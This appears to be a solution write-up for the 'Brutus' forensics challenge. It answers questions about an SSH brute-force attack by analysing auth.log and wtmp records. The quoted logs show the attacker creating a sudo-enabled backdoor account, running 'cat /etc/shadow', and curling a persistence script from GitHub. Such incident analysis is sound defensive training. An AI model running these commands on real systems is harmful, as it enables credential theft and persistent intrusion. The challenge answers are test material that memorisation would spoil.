# Brutus

**1. Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?**\
Ans: 65.2.161.68

Solution:

```bash
┌──(kali㉿kali)-[~/htb/sherlocks]
└─$ cat auth.log | grep -i "from"
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: drop connection #10 from [65.2.161.68]:46482 on [172.31.35.28]:22 past MaxStartups
...
```

---

**2. The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?**\
Ans: root

Solution:

```bash
┌──(kali㉿kali)-[~/htb/sherlocks]
└─$ cat auth.log | grep -i "from"
...
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
...
```

---

**3. Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.**\
Ans: 2024-03-06 06:32:45

Solution:

```bash
┌──(kali㉿kali)-[~/htb/sherlocks]
└─$ cat wtmp.out | grep -i 65.2.161.68
"USER"  "2549"  "pts/1" "ts/1"  "root"  "65.2.161.68"   "0"     "0"     "0"     "2024/03/06 06:32:45" "387923" "65.2.161.68"
"USER"  "2667"  "pts/1" "ts/1"  "cyberjunkie"   "65.2.161.68"   "0"     "0"     "0"     "2024/03/06 06:37:35"  "475575"        "65.2.161.68"
```

---

**4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?**\
Ans: 37

---

**5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**\
Ans:  cyberjunkie

Solution:

```bash
┌──(kali㉿kali)-[~/htb/sherlocks]
└─$ cat auth.log | grep -i "user"
...
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
Mar  6 06:35:01 ip-172-31-35-28 CRON[2614]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:35:01 ip-172-31-35-28 CRON[2616]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:35:01 ip-172-31-35-28 CRON[2615]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:35:01 ip-172-31-35-28 CRON[2614]: pam_unix(cron:session): session closed for user root
Mar  6 06:35:01 ip-172-31-35-28 CRON[2616]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:35:01 ip-172-31-35-28 CRON[2615]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
...
```

---

**6. What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**\
Ans: T1136.001

---

**7. What time did the attacker's first SSH session end according to auth.log?**\
Ans: 2024-03-06 06:37:24

Solution:

```bash
┌──(kali㉿kali)-[~/htb/sherlocks]
└─$ cat auth.log | grep -i "Disconnected"
...
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
...
```

---

**8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**\
Ans: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

Solution:

```bash
┌──(kali㉿kali)-[~/htb/sherlocks]
└─$ cat auth.log | grep -i "sudo"        
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
```
